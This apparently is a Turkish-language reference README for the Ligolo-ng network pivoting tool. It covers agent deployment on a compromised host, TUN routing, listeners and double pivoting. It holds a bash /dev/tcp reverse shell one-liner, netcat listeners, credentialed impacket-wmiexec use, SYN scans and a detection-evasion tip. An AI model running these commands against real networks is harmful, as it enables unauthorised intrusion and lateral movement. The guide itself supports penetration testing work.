# 🔀 Ligolo-ng - Kapsamlı Başvuru Kılavuzu

[🇺🇸 English Version](../README.md)

```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN Interface">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Network Pivoting">
</p>

<p align="center">
  <b>🌐 SOCKS proxy yerine TUN arayüzü kullanan, modern, basit ve yüksek performanslı ağ geçişi (pivoting) aracı</b>
</p>

---

## 📋 İçindekiler

- [Giriş](#-giriş)
- [Neden Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-neden-ligolo-ng)
- [Mimari ve Çalışma Mantığı](#-mimari-ve-çalışma-mantığı)
- [Kurulum](#-kurulum)
- [Hızlı Başlangıç Rehberi](#-hızlı-başlangıç-rehberi)
  - [Adım 1: Saldırgan Sistemde TUN Arayüzünü Oluşturma](#adım-1-saldırgan-sistemde-tun-arayüzünü-oluşturma)
  - [Adım 2: Ligolo-ng Proxy Sunucusunu Başlatma](#adım-2-ligolo-ng-proxy-sunucusunu-başlatma)
  - [Adım 3: Pivot Hedefe Agent Yükleme ve Bağlama](#adım-3-pivot-hedefe-agent-yükleme-ve-bağlama)
  - [Adım 4: Saldırgan Sistemde Yönlendirme (Routing) Ayarı](#adım-4-saldırgan-sistemde-yönlendirme-routing-ayarı)
  - [Adım 5: Tünel Oturumunu Başlatma](#adım-5-tünel-oturumunu-başlatma)
- [Tersine Port Yönlendirme (Listeners)](#-tersine-port-yönlendirme-listeners)
- [Çift Kademeli Pivot (Double Pivoting)](#-çift-kademeli-pivot-double-pivoting)
- [Proxy Etkileşimli Komut Referansı](#-proxy-etkileşimli-komut-referansı)
- [Agent Komut Satırı Seçenekleri](#-agent-komut-satırı-seçenekleri)
- [Sorun Giderme ve En İyi Pratikler](#-sorun-giderme-ve-en-i̇yi-pratikler)
- [Yasal Uyarı](#-yasal-uyarı)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş

**Ligolo-ng**, Go diliyle geliştirilmiş modern, hafif ve son derece hızlı bir tünelleme ve ağ geçişi (pivoting) aracıdır. Geleneksel SOCKS proxy çözümlerinin (standart Chisel veya SSH dinamik port yönlendirme gibi) aksine Ligolo-ng, saldırgan makinenizde doğrudan sanal bir **TUN arayüzü** oluşturur.

Bu yaklaşım, ele geçirilen pivot makineyi adeta yerel bir VPN ağ geçidine dönüştürür. Böylece saldırgan makinenizdeki tüm araçlar (`nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket`, web tarayıcıları vb.), komutların başına `proxychains` yazma zorunluluğu olmadan iç ağdaki tüm IP adreslerine doğrudan erişebilir.

---

## ⚖️ Neden Ligolo-ng?

| Özellik | Ligolo-ng | Proxychains + SOCKS | SSH SOCKS (`-D`) |
|---------|-----------|---------------------|------------------|
| **Protokol Desteği** | Tam TCP ve UDP | Yalnızca TCP (zayıf UDP) | Yalnızca TCP |
| **Nmap SYN Taraması (`-sS`)**| ✅ Evet (Doğal) | ❌ Hayır (TCP `-sT` gerekir) | ❌ Hayır |
| **Araç Uyumluluğu** | %100 (Çekirdek IP yığını) | Tutarsız (`LD_PRELOAD`) | Tutarsız |
| **Hız ve Gecikme** | ⭐⭐⭐⭐⭐ Çok Hızlı | ⭐⭐⭐ Orta | ⭐⭐⭐ Orta |
| **SOCKS Sarmalayıcı** | ❌ Gerek yok | ✅ Zorunlu | ✅ Zorunlu |
| **Tersine Dinleyiciler (Listener)**| ✅ Dahili | ❌ Harici araç gerekir | ❌ Sınırlı |

---

## 🏗️ Mimari ve Çalışma Mantığı

```
+-------------------+                          +---------------------+                          +----------------------+
| Saldırgan Makine  |                          |    Pivot Hedef      |                          |  İç Ağdaki Hedef     |
| (192.168.1.100)   |                          | (Çift Ağ Kartlı)    |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy sunucusu]  | <=== TLS Tüneli =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 arayüzü]    |                          |    +--------------->| == İç Ağ Trafiği ======> | [Hedef Servis]       |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80 vb.)   |
+-------------------+                          +---------------------+                          +----------------------+
```

1. **Proxy:** Saldırgan makinenizde çalışır, oturumları yönetir ve TUN arayüzü ile bağlı agent'lar arasındaki paketleri köprüler.
2. **Agent:** Ele geçirilen iç ağ makinesinde (Linux, Windows, macOS, ARM) çalışan hafif bir ikilidir.
3. **TUN Arayüzü:** Linux saldırgan sisteminde oluşturulan ve iç ağ bloklarına giden trafiği doğrudan Ligolo tüneline yönlendiren sanal bir ağ aygıtıdır.

---

## 📥 Kurulum

En güncel **proxy** ve **agent** ikililerini GitHub Releases sayfasından indirin:

```bash
# Saldırgan için proxy ikilisini indirin
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Hedefler için agent ikililerini indirin
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```

---

## 🚀 Hızlı Başlangıç Rehberi

### Adım 1: Saldırgan Sistemde TUN Arayüzünü Oluşturma

Proxy'yi başlatmadan önce Linux saldırgan makinenizde kalıcı bir TUN aygıtı tanımlayın:

```bash
# "ligolo" adında bir TUN arayüzü oluşturun
sudo ip tuntap add user $USER mode tun ligolo

# Arayüzü ayağa kaldırın (UP)
sudo ip link set ligolo up

# Durumu kontrol edin
ip link show ligolo
```

### Adım 2: Ligolo-ng Proxy Sunucusunu Başlatma

Kendinden imzalı TLS sertifikalarıyla proxy'yi başlatın:

```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```

> **İpucu:** Gerçek Red Team operasyonlarında tespit edilmemek için `-certfile` ve `-keyfile` ile geçerli Let's Encrypt sertifikaları tanımlayabilirsiniz.

### Adım 3: Pivot Hedefe Agent Yükleme ve Bağlama

Agent ikilisini ele geçirdiğiniz pivot sisteme aktarıp çalıştırın:

#### Linux Hedefte:
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```

#### Windows Hedefte:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```

### Adım 4: Saldırgan Sistemde Yönlendirme (Routing) Ayarı

Agent bağlandığında proxy konsolunda belirecektir. Pivot makinenin iç ağ kartını (örn: `172.16.1.0/24`) öğrenin.

Saldırgan makinenizde ayrı bir terminal açarak yönlendirme rotasını ekleyin:

```bash
# Hedef iç ağı ligolo arayüzüne yönlendirin
sudo ip route add 172.16.1.0/24 dev ligolo

# Rota tablosunu doğrulayın
ip route show | grep ligolo
```

### Adım 5: Tünel Oturumunu Başlatma

Ligolo-ng proxy terminaline dönün:

```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```

Artık iç ağdaki makinelere doğrudan IP üzerinden erişebilirsiniz!

```bash
# İç makineye ping atın
ping -c 3 172.16.1.50

# Proxychains olmadan doğrudan Nmap SYN taraması yapın!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Impacket araçlarını doğrudan çalıştırın
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```

---

## 🔄 Tersine Port Yönlendirme (Listeners)

İç ağda bulunan ve saldırgan makinenize doğrudan erişimi olmayan bir sistemden ters kabuk (reverse shell) almak için **listener** özelliğini kullanın.

Bu özellik, pivot makinede bir dinleyici portu açar ve gelen trafiği saldırgan makinenize yönlendirir.

### Örnek: Ters Kabuk (Reverse Shell) Yakalama

Proxy oturumu içindeyken:

```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```

**Saldırgan makinenizde**:

```bash
nc -lvnp 4444
```

**İç ağdaki ikinci hedefte** (`172.16.1.75`):

```bash
# Ters kabuğu pivot makinenin iç IP adresine yönlendirin
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```

Pivot makine bağlantıyı doğrudan saldırgan makinenizdeki netcat dinleyicisine köprüler!

---

## ⛓️ Çift Kademeli Pivot (Double Pivoting)

Daha derin ağlara (Alt Ağ A -> Alt Ağ B -> Alt Ağ C) erişmek gerektiğinde:

1. Pivot 1 (`172.16.1.10`) ile ilk tünelinizi kurun.
2. Alt Ağ B'de bulunan Pivot 2'yi (`10.0.0.25`) tespit edin.
3. Pivot 1 üzerinde yeni bir dinleyici açarak Alt Ağ B'den gelen trafiği proxy'nin `11601` portuna yönlendirin:
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. Pivot 2 üzerinde agent'ı başlatıp Pivot 1 IP'sine bağlayın:
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. Proxy'nizde ikinci bir oturum belirecektir! Alt Ağ C için rotayı ekleyin:
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. 2. oturuma geçip `start` komutunu verin.

---

## ⌨️ Proxy Etkileşimli Komut Referansı

| Komut | Açıklama | Örnek |
|-------|----------|-------|
| `session` | Bağlı agent oturumlarını listeler ve seçer | `session` |
| `start` | Seçili agent üzerinden paket tünellemeyi başlatır | `start` |
| `stop` | Aktif tünel oturumunu sonlandırır | `stop` |
| `ifconfig` | Seçili agent'ın ağ arayüzlerini listeler | `ifconfig` |
| `listener_add` | Pivot agent üzerinde dinleyici port açar | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| Aktif dinleyicileri listeler | `listener_list` |
| `listener_close`| Belirli bir dinleyiciyi kapatır | `listener_close --id 0` |
| `help` | Komut yardımını gösterir | `help` |
| `exit` | Proxy'yi kapatır veya ana menüye döner | `exit` |

---

## ⚙️ Agent Komut Satırı Seçenekleri

| Parametre | Açıklama | Örnek |
|-----------|----------|-------|
| `-connect` | Ligolo proxy sunucusunun adresi ve portu | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | TLS sertifika doğrulamasını atlar | `-ignore-cert` |
| `-retry` | Bağlantı koptuğunda otomatik yeniden dener | `-retry` |
| `-auto-clear` | Çalıştırıldığında terminal çıktısını temizler | `-auto-clear` |

---

## 💡 Sorun Giderme ve En İyi Pratikler

1. **Test Sonunda TUN Arayüzünü Temizleyin:**
   Sızma testi tamamlandığında rota çakışmalarını önlemek için arayüzü silin:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **IP Alt Ağ Çakışmalarına Dikkat Edin:**
   Yönlendirdiğiniz iç alt ağ (örn: `192.168.1.0/24`), kendi yerel ağınızla çakışıyorsa `/32` ile tekil host rotası verin (`sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Pivot Makinede Güvenlik Duvarı:**
   Windows hedeflerde giden (outbound) 11601 portunun veya açtığınız listener portunun Windows Güvenlik Duvarı tarafından engellenmediğinden emin olun.
4. **Operasyonlarda `-retry` Kullanın:**
   Ağ kesintilerinde agent'ın otomatik yeniden bağlanması için komuta daima `-retry` parametresini ekleyin.

---

## ⚠️ Yasal Uyarı

> **ÖNEMLİ:** Ligolo-ng güçlü bir ağ yönlendirme aracıdır. Yalnızca yazılı izin alınmış penetrasyon testlerinde, Red Team tatbikatlarında ve etik güvenlik araştırmalarında kullanılmalıdır.

---

## 📚 Kaynaklar

- [Resmi Ligolo-ng GitHub Deposu](https://github.com/nicocha30/ligolo-ng)
- [Resmi Ligolo-ng Dokümantasyonu](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)
